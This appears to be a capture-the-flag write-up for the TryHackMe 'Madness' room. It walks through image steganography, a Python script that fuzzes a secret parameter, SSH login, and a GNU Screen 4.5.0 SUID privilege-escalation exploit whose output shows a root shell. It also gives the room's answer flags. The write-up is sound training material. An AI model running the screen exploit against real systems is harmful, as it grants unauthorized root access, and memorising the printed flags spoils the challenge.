# Madness

Will you be consumed by Madness?

[Madness](https://tryhackme.com/room/madness)

## Topic's

- Web Poking
- Reverse Engineering
- Python Scripting (Fuzzing)
- Steganography
- Abusing SUID/GUID

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Flag Submission

Please note this challenge does not require SSH brute forcing.

Use your skills to access the user and root account!

This room is part of the Turmoil series

[view-source:http://10.10.19.96/](view-source:http://10.10.19.96/)

```html
<img src="thm.jpg" class="floating_element" />
<!-- They will never find me-->
```

```
wget http://10.10.19.96/thm.jpg

kali@kali:~/CTFs/tryhackme/Madness$ xxd thm.jpg | head
00000000: 8950 4e47 0d0a 1a0a 0000 0001 0100 0001  .PNG............
00000010: 0001 0000 ffdb 0043 0003 0202 0302 0203  .......C........
00000020: 0303 0304 0303 0405 0805 0504 0405 0a07  ................
00000030: 0706 080c 0a0c 0c0b 0a0b 0b0d 0e12 100d  ................
00000040: 0e11 0e0b 0b10 1610 1113 1415 1515 0c0f  ................
00000050: 1718 1614 1812 1415 14ff db00 4301 0304  ............C...
00000060: 0405 0405 0905 0509 140d 0b0d 1414 1414  ................
00000070: 1414 1414 1414 1414 1414 1414 1414 1414  ................
00000080: 1414 1414 1414 1414 1414 1414 1414 1414  ................
00000090: 1414 1414 1414 1414 1414 1414 1414 ffc0  ................

kali@kali:~/CTFs/tryhackme/Madness$ printf '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01' | dd conv=notrunc of=thm.jpg bs=1
12+0 records in
12+0 records out
12 bytes copied, 8.2589e-05 s, 145 kB/s
```

![](./thm.jpg)

`/th1s_1s_h1dd3n`

```py
#!/usr/bin/env python3

import requests

host = '10.10.19.96'
url = 'http://{}/th1s_1s_h1dd3n/?secret={}'

for i in range(100):
    r = requests.get(url.format(host, i))
    if not 'That is wrong!' in r.text:
        print("Found secret: {}".format(i))
        print(r.text)
```

```
kali@kali:~/CTFs/tryhackme/Madness$ python3 hidden_secret.py
Found secret: 73
```

```html
<html>
  <head>
    <title>Hidden Directory</title>
    <link href="stylesheet.css" rel="stylesheet" type="text/css" />
  </head>
  <body>
    <div class="main">
      <h2>Welcome! I have been expecting you!</h2>
      <p>To obtain my identity you need to guess my secret!</p>
      <!-- It's between 0-99 but I don't think anyone will look here-->

      <p>Secret Entered: 73</p>

      <p>Urgh, you got it right! But I won't tell you who I am! y2RPJ4QaPF!B</p>
    </div>
  </body>
</html>
```

`y2RPJ4QaPF!B`

```
kali@kali:~/CTFs/tryhackme/Madness$ steghide extract -sf thm.jpg
Enter passphrase:
wrote extracted data to "hidden.txt".
kali@kali:~/CTFs/tryhackme/Madness$ cat hidden.txt
Fine you found the password!

Here's a username

wbxre

I didn't say I would make it easy for you!

kali@kali:~/CTFs/tryhackme/Madness$ echo -n "wbxre" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
joker
```

```
kali@kali:~/CTFs/tryhackme/Madness$ steghide extract -sf 5iW7kC8.jpg
Enter passphrase:
wrote extracted data to "password.txt".
kali@kali:~/CTFs/tryhackme/Madness$ cat password.txt
I didn't think you'd find me! Congratulations!

Here take my password

*axA&GF8dP
```

```
kali@kali:~/CTFs/tryhackme/Madness$ ssh joker@10.10.19.96
joker@10.10.19.96's password:
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-170-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sun Jan  5 18:51:33 2020 from 192.168.244.128
joker@ubuntu:~$
```

```
joker@ubuntu:~$ ls -la
total 20
drwxr-xr-x 3 joker joker 4096 Oct 14 03:08 .
drwxr-xr-x 3 root  root  4096 Jan  4  2020 ..
-rw------- 1 joker joker    0 Jan  5  2020 .bash_history
-rw-r--r-- 1 joker joker 3771 Jan  4  2020 .bashrc
drwx------ 2 joker joker 4096 Oct 14 03:08 .cache
-rw-r--r-- 1 root  root    38 Jan  6  2020 user.txt
joker@ubuntu:~$ cat user.txt
THM{d5781e53b130efe2f94f9b0354a5e4ea}
```

```
joker@ubuntu:~$ find / -user root -perm -u=s 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/sudo
/bin/fusermount
/bin/su
/bin/ping6
/bin/screen-4.5.0
/bin/screen-4.5.0.old
/bin/mount
/bin/ping
/bin/umount
joker@ubuntu:~$ ls -l /bin/screen*
lrwxrwxrwx 1 root root      12 Jan  4  2020 /bin/screen -> screen-4.5.0
-rwsr-xr-x 1 root root 1588648 Jan  4  2020 /bin/screen-4.5.0
-rwsr-xr-x 1 root root 1588648 Jan  4  2020 /bin/screen-4.5.0.old
lrwxrwxrwx 1 root root      12 Jan  4  2020 /bin/screen.old -> screen-4.5.0
joker@ubuntu:~$
```

[GNU Screen 4.5.0 - Local Privilege Escalation](https://www.exploit-db.com/exploits/41154)

```
joker@ubuntu:/tmp$ sh 41154.sh
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function ‘dropshell’:
/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
     ^
/tmp/rootshell.c: In function ‘main’:
/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
     setuid(0);
     ^
/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
     setgid(0);
     ^
/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
     seteuid(0);
     ^
/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
     setegid(0);
     ^
/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
     execvp("/bin/sh", NULL, NULL);
     ^
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-joker.

# id
uid=0(root) gid=0(root) groups=0(root),1000(joker)
# cat /root/root.txt
THM{5ecd98aa66a6abb670184d7547c8124a}
```

1. user.txt

`THM{d5781e53b130efe2f94f9b0354a5e4ea}`

2. root.txt

`THM{5ecd98aa66a6abb670184d7547c8124a}`
